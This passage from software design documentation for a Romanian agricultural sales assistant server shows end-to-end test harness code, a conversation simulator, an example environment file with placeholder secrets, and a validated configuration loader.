        created_at TIMESTAMPTZ DEFAULT NOW(),
        updated_at TIMESTAMPTZ DEFAULT NOW()
      )`,
      `CREATE TABLE IF NOT EXISTS messages (
        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
        conversation_id UUID REFERENCES conversations(id),
        role VARCHAR(20) NOT NULL,
        content TEXT NOT NULL,
        metadata JSONB DEFAULT '{}',
        created_at TIMESTAMPTZ DEFAULT NOW()
      )`,
      `CREATE TABLE IF NOT EXISTS products (
        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
        tenant_id VARCHAR(255) NOT NULL,
        name VARCHAR(500) NOT NULL,
        sku VARCHAR(100),
        category VARCHAR(100),
        price DECIMAL(15,2),
        stock_quantity INTEGER DEFAULT 0,
        metadata JSONB DEFAULT '{}',
        created_at TIMESTAMPTZ DEFAULT NOW()
      )`,
      `CREATE TABLE IF NOT EXISTS orders (
        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
        tenant_id VARCHAR(255) NOT NULL,
        conversation_id UUID REFERENCES conversations(id),
        customer_id VARCHAR(50) NOT NULL,
        status VARCHAR(50) DEFAULT 'pending',
        total_amount DECIMAL(15,2),
        items JSONB NOT NULL,
        created_at TIMESTAMPTZ DEFAULT NOW()
      )`
    ];

    for (const migration of migrations) {
      await this.pgPool.query(migration);
    }
  }

  private async seedTestData(): Promise<void> {
    // Seed products
    const products = [
      {
        tenant_id: 'test-tenant',
        name: 'Semințe Grâu Premium',
        sku: 'SEM-GRAU-001',
        category: 'semințe',
        price: 2500.00,
        stock_quantity: 10000
      },
      {
        tenant_id: 'test-tenant',
        name: 'Fertilizant NPK 15-15-15',
        sku: 'FERT-NPK-001',
        category: 'fertilizanți',
        price: 1800.00,
        stock_quantity: 5000
      },
      {
        tenant_id: 'test-tenant',
        name: 'Tractor John Deere 6M',
        sku: 'TRACT-JD-6M',
        category: 'utilaje',
        price: 450000.00,
        stock_quantity: 3
      },
      {
        tenant_id: 'tenant-1',
        name: 'Product Tenant 1',
        sku: 'T1-001',
        category: 'general',
        price: 100.00,
        stock_quantity: 100
      },
      {
        tenant_id: 'tenant-2',
        name: 'Product Tenant 2',
        sku: 'T2-001',
        category: 'general',
        price: 200.00,
        stock_quantity: 200
      }
    ];

    for (const product of products) {
      await this.pgPool.query(
        `INSERT INTO products (tenant_id, name, sku, category, price, stock_quantity)
         VALUES ($1, $2, $3, $4, $5, $6)`,
        [product.tenant_id, product.name, product.sku, product.category, 
         product.price, product.stock_quantity]
      );
    }
  }

  private async waitForReady(): Promise<void> {
    const maxAttempts = 30;
    let attempts = 0;

    while (attempts < maxAttempts) {
      try {
        await this.client.healthCheck();
        return;
      } catch {
        attempts++;
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }

    throw new Error('MCP Server failed to become ready');
  }

  async createSession(params: {
    userId: string;
    tenantId: string;
    previousSessionId?: string;
  }): Promise<TestSession> {
    const response = await this.client.createSession({
      userId: params.userId,
      tenantId: params.tenantId,
      previousSessionId: params.previousSessionId
    });

    return {
      id: response.id,
      userId: params.userId,
      tenantId: params.tenantId,
      token: response.token
    };
  }

  async createConversation(params: {
    sessionId: string;
    customerId: string;
    channel: string;
    context?: Record<string, any>;
  }): Promise<TestConversation> {
    const response = await this.client.createConversation({
      sessionId: params.sessionId,
      customerId: params.customerId,
      channel: params.channel,
      context: params.context
    });

    return {
      id: response.id,
      sessionId: params.sessionId,
      customerId: params.customerId,
      channel: params.channel
    };
  }

  async createTestConversation(params?: {
    channel?: string;
  }): Promise<{ session: TestSession; conversation: TestConversation }> {
    const session = await this.createSession({
      userId: 'test-agent',
      tenantId: 'test-tenant'
    });

    const conversation = await this.createConversation({
      sessionId: session.id,
      customerId: 'RO12345678',
      channel: params?.channel || 'web_chat'
    });

    return { session, conversation };
  }

  async getSessionState(sessionId: string): Promise<any> {
    return this.client.getSessionState(sessionId);
  }

  async disconnectSession(sessionId: string): Promise<void> {
    await this.client.disconnectSession(sessionId);
  }

  async endSession(sessionId: string): Promise<void> {
    await this.client.endSession(sessionId);
  }

  async getConversationHistory(conversationId: string): Promise<any> {
    return this.client.getConversationHistory(conversationId);
  }

  async getHandoverStatus(conversationId: string): Promise<any> {
    return this.client.getHandoverStatus(conversationId);
  }

  async simulateAgentPickup(
    conversationId: string,
    agentId: string
  ): Promise<void> {
    await this.client.assignAgent(conversationId, agentId);
  }

  async getOrders(customerId: string): Promise<any[]> {
    const result = await this.pgPool.query(
      'SELECT * FROM orders WHERE customer_id = $1',
      [customerId]
    );
    return result.rows;
  }

  async mockExternalApi(
    apiName: string,
    config: { status: number; response?: any }
  ): Promise<void> {
    this.mocks.set(apiName, config);
    await this.redis.hset('mcp:mocks', apiName, JSON.stringify(config));
  }

  async mockLLM(config: { timeout?: boolean; response?: string }): Promise<void> {
    this.mocks.set('llm', config);
    await this.redis.hset('mcp:mocks', 'llm', JSON.stringify(config));
  }

  async simulateDatabaseFailure(table: string): Promise<void> {
    await this.redis.hset('mcp:db:failures', table, 'true');
  }

  async restoreDatabase(table: string): Promise<void> {
    await this.redis.hdel('mcp:db:failures', table);
  }
}
```

#### 10.6.3 Conversation Simulator

```typescript
// tests/e2e/conversation-simulator.ts

import { MCPClient } from '../../src/client/mcp-client';

export interface MessageResponse {
  message: {
    id: string;
    role: string;
    content: string;
    metadata: Record<string, any>;
  };
  toolsUsed: string[];
  resources: any[];
  intent?: string;
  sentiment?: string;
  conversationState?: string;
  objectionDetected?: boolean;
  competitorMentioned?: boolean;
  discountOffered?: {
    percentage: number;
    code?: string;
  };
  orderCreated?: boolean;
  handoverInitiated?: boolean;
  handoverCompleted?: boolean;
  contextRestored?: boolean;
  previousContext?: Record<string, any>;
  previousChannel?: string;
  fallbackUsed?: boolean;
  fallbackResponse?: boolean;
  error?: any;
  negotiationOutcome?: string;
}

export interface MessageResponseWithTiming extends MessageResponse {
  timing: {
    total: number;
    llm: number;
    tools: number;
    db: number;
  };
}

export class ConversationSimulator {
  private client: MCPClient;
  private env: any;

  constructor(env: any) {
    this.env = env;
    this.client = new MCPClient({
      baseUrl: env.getBaseUrl?.() || 'http://localhost:3000',
      timeout: 30000
    });
  }

  async sendMessage(
    conversationId: string,
    content: string,
    options?: {
      channel?: string;
      role?: string;
      sessionId?: string;
    }
  ): Promise<MessageResponse> {
    const startTime = Date.now();

    const response = await this.client.sendMessage({
      conversationId,
      message: {
        role: options?.role || 'user',
        content
      },
      channel: options?.channel,
      sessionId: options?.sessionId
    });

    const duration = Date.now() - startTime;

    return this.parseResponse(response, duration);
  }

  async sendMessageWithTiming(
    conversationId: string,
    content: string
  ): Promise<MessageResponseWithTiming> {
    const response = await this.client.sendMessageWithTiming({
      conversationId,
      message: {
        role: 'user',
        content
      }
    });

    return {
      ...this.parseResponse(response, response.timing?.total || 0),
      timing: {
        total: response.timing?.total || 0,
        llm: response.timing?.llm || 0,
        tools: response.timing?.tools || 0,
        db: response.timing?.db || 0
      }
    };
  }

  private parseResponse(response: any, duration: number): MessageResponse {
    return {
      message: {
        id: response.message.id,
        role: response.message.role,
        content: response.message.content,
        metadata: response.message.metadata || {}
      },
      toolsUsed: response.toolsUsed || [],
      resources: response.resources || [],
      intent: response.analysis?.intent,
      sentiment: response.analysis?.sentiment,
      conversationState: response.conversationState,
      objectionDetected: response.analysis?.objectionDetected,
      competitorMentioned: response.analysis?.competitorMentioned,
      discountOffered: response.discountOffered,
      orderCreated: response.orderCreated,
      handoverInitiated: response.handoverInitiated,
      handoverCompleted: response.handoverCompleted,
      contextRestored: response.contextRestored,
      previousContext: response.previousContext,
      previousChannel: response.previousChannel,
      fallbackUsed: response.fallbackUsed,
      fallbackResponse: response.fallbackResponse,
      error: response.error,
      negotiationOutcome: response.negotiationOutcome
    };
  }

  async simulateCustomerJourney(params: {
    conversationId: string;
    journey: string[];
    delayBetweenMessages?: number;
  }): Promise<MessageResponse[]> {
    const responses: MessageResponse[] = [];
    const delay = params.delayBetweenMessages || 1000;

    for (const message of params.journey) {
      const response = await this.sendMessage(params.conversationId, message);
      responses.push(response);
      await new Promise(resolve => setTimeout(resolve, delay));
    }

    return responses;
  }

  async runScenario(scenario: ConversationScenario): Promise<ScenarioResult> {
    const { session, conversation } = await this.env.createTestConversation({
      channel: scenario.channel
    });

    const results: MessageResponse[] = [];
    let success = true;
    const errors: string[] = [];

    for (const step of scenario.steps) {
      try {
        const response = await this.sendMessage(
          conversation.id,
          step.message,
          step.options
        );
        results.push(response);

        // Validate expectations
        if (step.expect) {
          for (const [key, expected] of Object.entries(step.expect)) {
            const actual = (response as any)[key];
            if (actual !== expected) {
              errors.push(
                `Step "${step.message.slice(0, 30)}...": ` +
                `Expected ${key} to be ${expected}, got ${actual}`
              );
              success = false;
            }
          }
        }
      } catch (error) {
        errors.push(
          `Step "${step.message.slice(0, 30)}...": ${(error as Error).message}`
        );
        success = false;
        break;
      }
    }

    return {
      success,
      errors,
      results,
      conversation,
      session
    };
  }
}

export interface ConversationScenario {
  name: string;
  description?: string;
  channel?: string;
  steps: ScenarioStep[];
}

export interface ScenarioStep {
  message: string;
  options?: {
    channel?: string;
    role?: string;
  };
  expect?: Partial<MessageResponse>;
}

export interface ScenarioResult {
  success: boolean;
  errors: string[];
  results: MessageResponse[];
  conversation: any;
  session: any;
}
```

---

## 11. Configuration & Deployment

### 11.1 Configuration Overview

The MCP Server uses a hierarchical configuration system supporting multiple environments.

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Configuration Hierarchy                          │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ┌──────────────┐                                                   │
│  │ Environment  │ ── Highest Priority                              │
│  │  Variables   │                                                   │
│  └──────┬───────┘                                                   │
│         │                                                           │
│  ┌──────▼───────┐                                                   │
│  │   Secrets    │ ── Sensitive Configuration                       │
│  │   (Docker)   │                                                   │
│  └──────┬───────┘                                                   │
│         │                                                           │
│  ┌──────▼───────┐                                                   │
│  │ Config Files │ ── Environment-Specific                          │
│  │  (.env.*)    │                                                   │
│  └──────┬───────┘                                                   │
│         │                                                           │
│  ┌──────▼───────┐                                                   │
│  │   Defaults   │ ── Built-in Defaults                             │
│  │   (Code)     │                                                   │
│  └──────────────┘                                                   │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 11.2 Environment Variables

```bash
# config/.env.example

# ═══════════════════════════════════════════════════════════════════
# MCP SERVER CONFIGURATION
# ═══════════════════════════════════════════════════════════════════

# ───────────────────────────────────────────────────────────────────
# Core Settings
# ───────────────────────────────────────────────────────────────────
NODE_ENV=production
MCP_SERVER_NAME=cerniq-mcp-server
MCP_SERVER_VERSION=1.0.0
MCP_HOST=0.0.0.0
MCP_PORT=3000
MCP_BASE_PATH=/api/mcp

# ───────────────────────────────────────────────────────────────────
# Database (PostgreSQL)
# ───────────────────────────────────────────────────────────────────
DATABASE_URL=postgresql://cerniq_user:${DB_PASSWORD}@postgres:5432/cerniq_db
DATABASE_POOL_MIN=5
DATABASE_POOL_MAX=20
DATABASE_POOL_ACQUIRE_TIMEOUT=30000
DATABASE_POOL_IDLE_TIMEOUT=10000
DATABASE_SSL=true
DATABASE_SSL_REJECT_UNAUTHORIZED=true

# ───────────────────────────────────────────────────────────────────
# Redis
# ───────────────────────────────────────────────────────────────────
REDIS_URL=redis://redis:6379
REDIS_PASSWORD=${REDIS_PASSWORD}
REDIS_DB=0
REDIS_KEY_PREFIX=mcp:
REDIS_TLS_ENABLED=false

# ───────────────────────────────────────────────────────────────────
# BullMQ
# ───────────────────────────────────────────────────────────────────
BULLMQ_CONCURRENCY=10
BULLMQ_MAX_JOBS_PER_WORKER=100
BULLMQ_STALLED_INTERVAL=30000
BULLMQ_LOCK_DURATION=60000

# ───────────────────────────────────────────────────────────────────
# Authentication
# ───────────────────────────────────────────────────────────────────
JWT_SECRET=${JWT_SECRET}
JWT_ACCESS_TOKEN_EXPIRY=15m
JWT_REFRESH_TOKEN_EXPIRY=7d
JWT_ISSUER=cerniq.app
JWT_AUDIENCE=mcp-server

# Session
SESSION_SECRET=${SESSION_SECRET}
SESSION_TIMEOUT=1800000
SESSION_MAX_AGE=86400000

# API Keys
API_KEY_SALT=${API_KEY_SALT}
API_KEY_HASH_ITERATIONS=100000

# ───────────────────────────────────────────────────────────────────
# LLM Configuration
# ───────────────────────────────────────────────────────────────────
ANTHROPIC_API_KEY=${ANTHROPIC_API_KEY}
ANTHROPIC_MODEL=claude-sonnet-4-20250514
ANTHROPIC_MAX_TOKENS=4096
ANTHROPIC_TEMPERATURE=0.7
ANTHROPIC_TIMEOUT=60000

OPENAI_API_KEY=${OPENAI_API_KEY}
OPENAI_MODEL=gpt-4o
OPENAI_MAX_TOKENS=4096

# LLM Routing
LLM_PRIMARY_PROVIDER=anthropic
LLM_FALLBACK_PROVIDER=openai
LLM_MAX_RETRIES=3
LLM_RETRY_DELAY=1000

# Cost Limits
LLM_DAILY_COST_LIMIT_USD=100
LLM_PER_REQUEST_COST_LIMIT_USD=1

# ───────────────────────────────────────────────────────────────────
# MCP Protocol
# ───────────────────────────────────────────────────────────────────
MCP_PROTOCOL_VERSION=2024-11-05
MCP_CLIENT_INFO_NAME=cerniq-mcp
MCP_CLIENT_INFO_VERSION=1.0.0

# Capabilities
MCP_CAPABILITY_TOOLS=true
MCP_CAPABILITY_RESOURCES=true
MCP_CAPABILITY_PROMPTS=true
MCP_CAPABILITY_LOGGING=true
MCP_CAPABILITY_SAMPLING=true

# ───────────────────────────────────────────────────────────────────
# Logging
# ───────────────────────────────────────────────────────────────────
LOG_LEVEL=info
LOG_FORMAT=json
LOG_PRETTY=false
LOG_TIMESTAMP=true
LOG_CALLER=false
LOG_REDACT_PATHS=["password","token","apiKey","secret"]

# ───────────────────────────────────────────────────────────────────
# Tracing (OpenTelemetry)
# ───────────────────────────────────────────────────────────────────
OTEL_ENABLED=true
OTEL_SERVICE_NAME=mcp-server
OTEL_EXPORTER_OTLP_ENDPOINT=http://signoz:4317
OTEL_EXPORTER_OTLP_PROTOCOL=grpc
OTEL_TRACES_SAMPLER=parentbased_traceidratio
OTEL_TRACES_SAMPLER_ARG=0.1

# ───────────────────────────────────────────────────────────────────
# Metrics (Prometheus)
# ───────────────────────────────────────────────────────────────────
METRICS_ENABLED=true
METRICS_PORT=9090
METRICS_PATH=/metrics
METRICS_PREFIX=mcp_

# ───────────────────────────────────────────────────────────────────
# Rate Limiting
# ───────────────────────────────────────────────────────────────────
RATE_LIMIT_ENABLED=true
RATE_LIMIT_WINDOW_MS=60000
RATE_LIMIT_MAX_REQUESTS=100
RATE_LIMIT_SKIP_SUCCESSFUL_REQUESTS=false
RATE_LIMIT_HEADERS=true

# Per-endpoint limits
RATE_LIMIT_AUTH_MAX=5
RATE_LIMIT_TOOLS_MAX=30
RATE_LIMIT_RESOURCES_MAX=50

# ───────────────────────────────────────────────────────────────────
# Security
# ───────────────────────────────────────────────────────────────────
CORS_ENABLED=true
CORS_ORIGIN=https://cerniq.app,https://api.cerniq.app
CORS_METHODS=GET,POST,PUT,DELETE,OPTIONS
CORS_CREDENTIALS=true
CORS_MAX_AGE=86400

HELMET_ENABLED=true
CSRF_ENABLED=true
CSRF_SECRET=${CSRF_SECRET}

# Encryption
ENCRYPTION_KEY=${ENCRYPTION_KEY}
ENCRYPTION_ALGORITHM=aes-256-gcm
ENCRYPTION_KEY_ROTATION_DAYS=30

# ───────────────────────────────────────────────────────────────────
# External Services
# ───────────────────────────────────────────────────────────────────
# ANAF API
ANAF_API_URL=https://webservicesp.anaf.ro/PlatitorTvaRest/api/v8
ANAF_TIMEOUT=10000

# Termene.ro
TERMENE_API_URL=https://termene.ro/api/v2
TERMENE_API_KEY=${TERMENE_API_KEY}

# Hunter.io
HUNTER_API_URL=https://api.hunter.io/v2
HUNTER_API_KEY=${HUNTER_API_KEY}

# Oblio.eu
OBLIO_API_URL=https://www.oblio.eu/api/v1
OBLIO_EMAIL=${OBLIO_EMAIL}
OBLIO_API_KEY=${OBLIO_API_KEY}

# ───────────────────────────────────────────────────────────────────
# Feature Flags
# ───────────────────────────────────────────────────────────────────
FEATURE_AI_AGENT=true
FEATURE_AUTO_NEGOTIATION=true
FEATURE_DOCUMENT_GENERATION=true
FEATURE_EFACTURA_INTEGRATION=true
FEATURE_WHATSAPP_CHANNEL=true
FEATURE_ADVANCED_ANALYTICS=false

# ───────────────────────────────────────────────────────────────────
# Tenant Defaults
# ───────────────────────────────────────────────────────────────────
TENANT_DEFAULT_TIER=starter
TENANT_DEFAULT_MAX_SESSIONS=25
TENANT_DEFAULT_MAX_TOKENS_DAY=100000
TENANT_DEFAULT_MAX_STORAGE_MB=100
TENANT_DATA_RETENTION_DAYS=365

# ───────────────────────────────────────────────────────────────────
# Health Checks
# ───────────────────────────────────────────────────────────────────
HEALTH_CHECK_INTERVAL=30000
HEALTH_CHECK_TIMEOUT=5000
HEALTH_CHECK_RETRIES=3
```

### 11.3 Configuration Loader

```typescript
// src/config/config-loader.ts

import { z } from 'zod';
import * as dotenv from 'dotenv';
import * as fs from 'fs';
import * as path from 'path';

// Configuration schema
const ConfigSchema = z.object({
  // Core
  nodeEnv: z.enum(['development', 'test', 'staging', 'production']),
  server: z.object({
    name: z.string().default('cerniq-mcp-server'),
    version: z.string().default('1.0.0'),
    host: z.string().default('0.0.0.0'),
    port: z.number().int().min(1).max(65535).default(3000),
    basePath: z.string().default('/api/mcp')
  }),

  // Database
  database: z.object({
    url: z.string().url(),
    pool: z.object({
      min: z.number().int().min(1).default(5),
      max: z.number().int().min(1).default(20),
      acquireTimeout: z.number().int().default(30000),
      idleTimeout: z.number().int().default(10000)
    }),
    ssl: z.boolean().default(true),
    sslRejectUnauthorized: z.boolean().default(true)
  }),

  // Redis
  redis: z.object({
    url: z.string(),
    password: z.string().optional(),
    db: z.number().int().default(0),
    keyPrefix: z.string().default('mcp:'),
    tlsEnabled: z.boolean().default(false)
  }),

  // BullMQ
  bullmq: z.object({
    concurrency: z.number().int().default(10),
    maxJobsPerWorker: z.number().int().default(100),
    stalledInterval: z.number().int().default(30000),
    lockDuration: z.number().int().default(60000)
  }),

  // Authentication
  auth: z.object({
    jwt: z.object({
      secret: z.string().min(32),
      accessTokenExpiry: z.string().default('15m'),
      refreshTokenExpiry: z.string().default('7d'),
      issuer: z.string().default('cerniq.app'),
      audience: z.string().default('mcp-server')
    }),
    session: z.object({
      secret: z.string().min(32),
      timeout: z.number().int().default(1800000),
      maxAge: z.number().int().default(86400000)
    }),
    apiKey: z.object({
      salt: z.string().min(16),
      hashIterations: z.number().int().default(100000)
    })
  }),

  // LLM
  llm: z.object({
    anthropic: z.object({
      apiKey: z.string(),
      model: z.string().default('claude-sonnet-4-20250514'),
      maxTokens: z.number().int().default(4096),
      temperature: z.number().min(0).max(2).default(0.7),
      timeout: z.number().int().default(60000)
    }),
    openai: z.object({
      apiKey: z.string().optional(),
      model: z.string().default('gpt-4o'),
      maxTokens: z.number().int().default(4096)
    }),
    routing: z.object({
      primaryProvider: z.enum(['anthropic', 'openai']).default('anthropic'),
      fallbackProvider: z.enum(['anthropic', 'openai']).optional(),
      maxRetries: z.number().int().default(3),
      retryDelay: z.number().int().default(1000)
    }),
    costs: z.object({
      dailyLimitUsd: z.number().default(100),
      perRequestLimitUsd: z.number().default(1)
    })
  }),

  // MCP Protocol
  mcp: z.object({
    protocolVersion: z.string().default('2024-11-05'),
    clientInfo: z.object({
      name: z.string().default('cerniq-mcp'),
      version: z.string().default('1.0.0')
    }),
    capabilities: z.object({
      tools: z.boolean().default(true),
      resources: z.boolean().default(true),
      prompts: z.boolean().default(true),
      logging: z.boolean().default(true),
      sampling: z.boolean().default(true)
    })
  }),

  // Logging
  logging: z.object({
    level: z.enum(['trace', 'debug', 'info', 'warn', 'error', 'fatal']).default('info'),
    format: z.enum(['json', 'pretty']).default('json'),
    pretty: z.boolean().default(false),
    timestamp: z.boolean().default(true),
    caller: z.boolean().default(false),
    redactPaths: z.array(z.string()).default(['password', 'token', 'apiKey', 'secret'])
  }),

  // Tracing
  tracing: z.object({
    enabled: z.boolean().default(true),
    serviceName: z.string().default('mcp-server'),
    endpoint: z.string().optional(),
    protocol: z.enum(['grpc', 'http']).default('grpc'),
    sampler: z.string().default('parentbased_traceidratio'),
    samplerArg: z.number().default(0.1)
  }),

  // Metrics
  metrics: z.object({
    enabled: z.boolean().default(true),
    port: z.number().int().default(9090),
    path: z.string().default('/metrics'),
    prefix: z.string().default('mcp_')
  }),

  // Rate Limiting
  rateLimit: z.object({
    enabled: z.boolean().default(true),
    windowMs: z.number().int().default(60000),
    maxRequests: z.number().int().default(100),
    skipSuccessfulRequests: z.boolean().default(false),
    headers: z.boolean().default(true),
    endpoints: z.record(z.number()).default({})
  }),

  // Security
  security: z.object({
    cors: z.object({
      enabled: z.boolean().default(true),
      origin: z.union([z.string(), z.array(z.string())]),
      methods: z.array(z.string()).default(['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS']),
      credentials: z.boolean().default(true),
      maxAge: z.number().int().default(86400)
    }),
    helmet: z.object({
      enabled: z.boolean().default(true)
    }),
    csrf: z.object({
      enabled: z.boolean().default(true),
      secret: z.string().min(32)
    }),
    encryption: z.object({
      key: z.string().min(32),
      algorithm: z.enum(['aes-256-gcm', 'aes-256-cbc', 'chacha20-poly1305']).default('aes-256-gcm'),
      keyRotationDays: z.number().int().default(30)
    })
  }),

  // External Services
  external: z.object({
    anaf: z.object({
      apiUrl: z.string().url(),
      timeout: z.number().int().default(10000)
    }),
    termene: z.object({
      apiUrl: z.string().url(),
      apiKey: z.string()
    }),
    hunter: z.object({
      apiUrl: z.string().url(),
      apiKey: z.string()
    }),
    oblio: z.object({
      apiUrl: z.string().url(),
      email: z.string().email(),
      apiKey: z.string()
    })
  }),

  // Feature Flags
  features: z.object({
    aiAgent: z.boolean().default(true),
    autoNegotiation: z.boolean().default(true),
    documentGeneration: z.boolean().default(true),
    efacturaIntegration: z.boolean().default(true),
    whatsappChannel: z.boolean().default(true),
    advancedAnalytics: z.boolean().default(false)
  }),

  // Tenant Defaults
  tenantDefaults: z.object({
    tier: z.enum(['free', 'starter', 'professional', 'enterprise']).default('starter'),
    maxSessions: z.number().int().default(25),
    maxTokensPerDay: z.number().int().default(100000),
    maxStorageMb: z.number().int().default(100),
    dataRetentionDays: z.number().int().default(365)
  }),

  // Health Checks
  healthCheck: z.object({
    interval: z.number().int().default(30000),
    timeout: z.number().int().default(5000),
    retries: z.number().int().default(3)
  })
});

export type Config = z.infer<typeof ConfigSchema>;

class ConfigLoader {
  private config: Config | null = null;
  private configPath: string;

  constructor() {
    this.configPath = process.env.CONFIG_PATH || path.join(process.cwd(), 'config');
  }

  load(): Config {
    if (this.config) {
      return this.config;
    }

    // Load environment-specific .env file
    const nodeEnv = process.env.NODE_ENV || 'development';
    const envFile = path.join(this.configPath, `.env.${nodeEnv}`);
    
    if (fs.existsSync(envFile)) {
      dotenv.config({ path: envFile });
    }

    // Load base .env file
    const baseEnvFile = path.join(this.configPath, '.env');
    if (fs.existsSync(baseEnvFile)) {
      dotenv.config({ path: baseEnvFile, override: false });
    }

    // Load secrets from Docker secrets if available
    this.loadDockerSecrets();

    // Build configuration object
    const rawConfig = this.buildConfigFromEnv();

    // Validate
    const result = ConfigSchema.safeParse(rawConfig);
    
    if (!result.success) {
      console.error('Configuration validation failed:');
      for (const error of result.error.errors) {
        console.error(`  ${error.path.join('.')}: ${error.message}`);
      }
      throw new Error('Invalid configuration');
    }

    this.config = result.data;
    return this.config;
  }

  private loadDockerSecrets(): void {
    const secretsPath = '/run/secrets';
    
    if (!fs.existsSync(secretsPath)) {
      return;
    }

    const secretMappings: Record<string, string> = {
      'db_password': 'DB_PASSWORD',
      'redis_password': 'REDIS_PASSWORD',
      'jwt_secret': 'JWT_SECRET',
      'session_secret': 'SESSION_SECRET',
      'api_key_salt': 'API_KEY_SALT',
      'anthropic_api_key': 'ANTHROPIC_API_KEY',
      'openai_api_key': 'OPENAI_API_KEY',
      'encryption_key': 'ENCRYPTION_KEY',
      'csrf_secret': 'CSRF_SECRET',
      'termene_api_key': 'TERMENE_API_KEY',
      'hunter_api_key': 'HUNTER_API_KEY',
      'oblio_api_key': 'OBLIO_API_KEY'
    };

    for (const [secretFile, envVar] of Object.entries(secretMappings)) {
      const secretPath = path.join(secretsPath, secretFile);
      
      if (fs.existsSync(secretPath)) {
        const secretValue = fs.readFileSync(secretPath, 'utf-8').trim();
        if (secretValue) {
          process.env[envVar] = secretValue;
        }
      }
    }
  }

  private buildConfigFromEnv(): any {
    const env = process.env;

    return {
      nodeEnv: env.NODE_ENV || 'development',
      
      server: {
        name: env.MCP_SERVER_NAME,
        version: env.MCP_SERVER_VERSION,
        host: env.MCP_HOST,
        port: parseInt(env.MCP_PORT || '3000'),
        basePath: env.MCP_BASE_PATH
      },

      database: {
        url: env.DATABASE_URL,
        pool: {
          min: parseInt(env.DATABASE_POOL_MIN || '5'),
          max: parseInt(env.DATABASE_POOL_MAX || '20'),
          acquireTimeout: parseInt(env.DATABASE_POOL_ACQUIRE_TIMEOUT || '30000'),
          idleTimeout: parseInt(env.DATABASE_POOL_IDLE_TIMEOUT || '10000')
        },
        ssl: env.DATABASE_SSL === 'true',
        sslRejectUnauthorized: env.DATABASE_SSL_REJECT_UNAUTHORIZED !== 'false'
      },

      redis: {
        url: env.REDIS_URL,
        password: env.REDIS_PASSWORD,
        db: parseInt(env.REDIS_DB || '0'),
        keyPrefix: env.REDIS_KEY_PREFIX,
        tlsEnabled: env.REDIS_TLS_ENABLED === 'true'
      },

      bullmq: {
        concurrency: parseInt(env.BULLMQ_CONCURRENCY || '10'),
        maxJobsPerWorker: parseInt(env.BULLMQ_MAX_JOBS_PER_WORKER || '100'),
        stalledInterval: parseInt(env.BULLMQ_STALLED_INTERVAL || '30000'),
        lockDuration: parseInt(env.BULLMQ_LOCK_DURATION || '60000')
      },

      auth: {
        jwt: {
          secret: env.JWT_SECRET,
          accessTokenExpiry: env.JWT_ACCESS_TOKEN_EXPIRY,
          refreshTokenExpiry: env.JWT_REFRESH_TOKEN_EXPIRY,
          issuer: env.JWT_ISSUER,
          audience: env.JWT_AUDIENCE
        },
        session: {
          secret: env.SESSION_SECRET,
          timeout: parseInt(env.SESSION_TIMEOUT || '1800000'),
          maxAge: parseInt(env.SESSION_MAX_AGE || '86400000')
        },
        apiKey: {
          salt: env.API_KEY_SALT,
          hashIterations: parseInt(env.API_KEY_HASH_ITERATIONS || '100000')
        }
      },

      llm: {
        anthropic: {
          apiKey: env.ANTHROPIC_API_KEY,
          model: env.ANTHROPIC_MODEL,
          maxTokens: parseInt(env.ANTHROPIC_MAX_TOKENS || '4096'),
          temperature: parseFloat(env.ANTHROPIC_TEMPERATURE || '0.7'),
          timeout: parseInt(env.ANTHROPIC_TIMEOUT || '60000')
        },
        openai: {
          apiKey: env.OPENAI_API_KEY,
          model: env.OPENAI_MODEL,
          maxTokens: parseInt(env.OPENAI_MAX_TOKENS || '4096')
        },
        routing: {
          primaryProvider: env.LLM_PRIMARY_PROVIDER as 'anthropic' | 'openai',
          fallbackProvider: env.LLM_FALLBACK_PROVIDER as 'anthropic' | 'openai' | undefined,
          maxRetries: parseInt(env.LLM_MAX_RETRIES || '3'),
          retryDelay: parseInt(env.LLM_RETRY_DELAY || '1000')
        },
        costs: {
          dailyLimitUsd: parseFloat(env.LLM_DAILY_COST_LIMIT_USD || '100'),
          perRequestLimitUsd: parseFloat(env.LLM_PER_REQUEST_COST_LIMIT_USD || '1')
        }
      },

      mcp: {
        protocolVersion: env.MCP_PROTOCOL_VERSION,
        clientInfo: {
          name: env.MCP_CLIENT_INFO_NAME,
          version: env.MCP_CLIENT_INFO_VERSION
        },
        capabilities: {
          tools: env.MCP_CAPABILITY_TOOLS !== 'false',
          resources: env.MCP_CAPABILITY_RESOURCES !== 'false',
          prompts: env.MCP_CAPABILITY_PROMPTS !== 'false',
          logging: env.MCP_CAPABILITY_LOGGING !== 'false',
          sampling: env.MCP_CAPABILITY_SAMPLING !== 'false'
        }
      },

      logging: {
        level: env.LOG_LEVEL as any,
        format: env.LOG_FORMAT as 'json' | 'pretty',
        pretty: env.LOG_PRETTY === 'true',
        timestamp: env.LOG_TIMESTAMP !== 'false',
        caller: env.LOG_CALLER === 'true',
        redactPaths: env.LOG_REDACT_PATHS ? JSON.parse(env.LOG_REDACT_PATHS) : undefined
      },

      tracing: {
        enabled: env.OTEL_ENABLED !== 'false',
        serviceName: env.OTEL_SERVICE_NAME,
        endpoint: env.OTEL_EXPORTER_OTLP_ENDPOINT,
        protocol: env.OTEL_EXPORTER_OTLP_PROTOCOL as 'grpc' | 'http',
        sampler: env.OTEL_TRACES_SAMPLER,
        samplerArg: parseFloat(env.OTEL_TRACES_SAMPLER_ARG || '0.1')
      },

      metrics: {
        enabled: env.METRICS_ENABLED !== 'false',
        port: parseInt(env.METRICS_PORT || '9090'),
        path: env.METRICS_PATH,
        prefix: env.METRICS_PREFIX
      },

      rateLimit: {
        enabled: env.RATE_LIMIT_ENABLED !== 'false',
        windowMs: parseInt(env.RATE_LIMIT_WINDOW_MS || '60000'),
        maxRequests: parseInt(env.RATE_LIMIT_MAX_REQUESTS || '100'),
        skipSuccessfulRequests: env.RATE_LIMIT_SKIP_SUCCESSFUL_REQUESTS === 'true',
        headers: env.RATE_LIMIT_HEADERS !== 'false',
        endpoints: {
          '/auth/login': parseInt(env.RATE_LIMIT_AUTH_MAX || '5'),
          '/tools/execute': parseInt(env.RATE_LIMIT_TOOLS_MAX || '30'),
          '/resources/load': parseInt(env.RATE_LIMIT_RESOURCES_MAX || '50')
        }
      },

      security: {
        cors: {
          enabled: env.CORS_ENABLED !== 'false',
